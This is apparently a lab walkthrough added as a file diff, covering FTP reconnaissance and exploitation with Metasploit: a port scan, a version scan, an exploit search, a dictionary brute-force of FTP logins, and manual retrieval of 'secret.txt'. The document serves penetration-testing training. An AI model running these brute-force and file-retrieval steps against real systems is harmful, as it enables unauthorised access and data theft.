@@ -1,0 +1,127 @@
+📁 FTP Enumeration and Exploitation Workflow
+This workflow documents the reconnaissance, authentication attacks, and initial file retrieval against a target system running an FTP service, utilizing Metasploit and basic command-line tools.
+
+Phase 1: Initial Setup and Reconnaissance
+Objective: Verify the target environment and perform an initial port scan to confirm the FTP service is running.
+
+Environment Setup
+Bash
+
+# Start the Metasploit database service
+service postgresql start
+
+# Identify the target IP address
+# Assuming Attacker IP (eth1) is 195.51.147.2
+# Target IP will be the adjacent host
+Target IP: 195.51.147.3
+
+# Start Metasploit console
+msfconsole
+Workspace and Port Scanning
+Bash
+
+# Create a new workspace for this task
+msf5 > workspace -a FTP_ENUM
+
+# Search for the port scanning module (to confirm FTP port 21 is open)
+msf5 > search portscan
+
+# Use the desired port scan module (using '6' as an example index)
+msf5 > use 6 
+# Note: It's better to use the full path, e.g., use auxiliary/scanner/portscan/tcp
+
+# View configuration options
+msf5 > show options
+
+# Set the target IP address
+msf5 > set RHOSTS 195.51.147.3
+
+# Execute the port scan
+msf5 > run
+
+# Return to the main msfconsole prompt
+msf5 > back
+Phase 2: FTP Service Enumeration (Version Scanning)
+Objective: Use an auxiliary module to gather the specific version information of the running FTP service.
+
+FTP Version Module
+Bash
+
+# Search for FTP auxiliary modules
+msf5 > search type:auxiliary name:ftp
+
+# Select the module for gathering FTP version information
+msf5 > use auxiliary/scanner/ftp/ftp_version
+
+# View configuration options
+msf5 > show options
+
+# Set the target IP address
+msf5 > set RHOSTS 195.51.147.3
+
+# Execute the module
+msf5 > run
+Exploit Search (Based on Version)
+Bash
+
+# If the version scan reveals a specific service (e.g., ProFTPD), search for exploits
+msf5 > search ProFTPD 
+# This helps identify any known vulnerabilities for the discovered service.
+Phase 3: Credential Brute-Forcing
+Objective: Attempt to gain unauthorized access by brute-forcing common usernames and passwords against the FTP login.
+
+FTP Login Brute-Force Module
+Bash
+
+# Return to the main console
+msf5 > back
+
+# Search again for FTP auxiliary modules
+msf5 > search type:auxiliary name:ftp
+
+# Select the module for dictionary-based FTP login attempts
+msf5 > use auxiliary/scanner/ftp/ftp_login
+
+# View configuration options (RHOSTS, USER_FILE, PASS_FILE)
+msf5 > show options
+
+# Set the path to a file containing a list of usernames
+msf5 > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+# Note: Corrected wordlist path for clarity.
+
+# Set the path to a file containing a list of passwords
+msf5 > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+# Note: Corrected wordlist path for clarity.
+
+# Execute the brute-force attack
+msf5 > run
+Phase 4: Manual Access and File Retrieval
+Objective: Use the discovered credentials to manually log in and extract sensitive files.
+
+Manual FTP Session
+Bash
+
+# Exit Metasploit (optional, but standard practice for manual testing)
+msf5 > exit
+
+# Initiate a manual FTP connection from the attacker's shell
+root@attackdefense:~# ftp 195.51.147.3
+
+# Provide the discovered credentials
+user: username
+password: password
+
+# List files on the remote server
+ftp> ls
+
+# Retrieve a target file (e.g., a sensitive file named 'secret.txt')
+ftp> get secret.txt
+
+# Exit the FTP session
+ftp> exit
+
+# Verify the file was downloaded to the attacker's system
+root@attackdefense:~# ls
+
+# View the contents of the retrieved file
+root@attackdefense:~# cat secret.txt
